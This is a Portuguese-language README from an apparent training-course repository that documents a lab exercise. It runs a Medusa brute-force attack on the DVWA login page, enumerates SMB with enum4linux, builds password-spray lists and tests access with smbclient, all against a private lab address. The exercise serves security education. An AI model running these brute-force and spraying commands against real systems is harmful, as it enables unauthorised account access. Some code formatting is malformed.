# Desafio-DIO-Cyber-Security
Documentação técnica da execução de um ataque de força bruta contra o DVWA utilizando a ferramenta Medusa. O repositório contém o README detalhado com a análise de comandos, wordlists customizadas, scripts de configuração e evidências visuais (screenshots) da autenticação bem-sucedida, seguindo rigorosamente as etapas das vídeo-aulas.

# Desafio de Segurança: DVWA Brute-Force & Analysis

## 📋 Visão Geral
Este repositório documenta o processo de análise de vulnerabilidades no Damn Vulnerable Web Application (DVWA), focando em técnicas de brute-force via Medusa e análise de respostas HTTP.

## 🛠️ Ferramentas Utilizadas
- **Medusa:** Ferramenta de brute-force para autenticação.
- **DVWA:** Ambiente de teste (Nível: Low/Medium).
- **Wordlists:** Listas personalizadas para usuários e senhas.

## 🚀 Execução
### 1. Preparação
criar as wordlists
Wordlists

''bash
echo -e "users\nadmin\nmsfadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Utilizando o Medusa para Simular o Ataque para obter acesso

''bash
medusa -h 192.168.56.105 -U users.txt -P pass.txt -M http 
-m PAGE:'/dvwa/login.php' /
-m FORM:'username=^USER^&password=^PASS^&Login=Login' /
-m 'FAIL=Login failed' -t 6

Simulando um Cenario Corporativo Mal configurado

''bash
enum4linux -a 192.168.56.105 | tee enum4_output.txt
less enum4_output.txt

Criando Lista de Usuario e Senhas

''bash
echo -e "user\msfadmin\nservice" > sub_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

Testando Acesso Utilizando Smbclient

''bash
smbclient -L //192.168.56.105 -U msfadmin
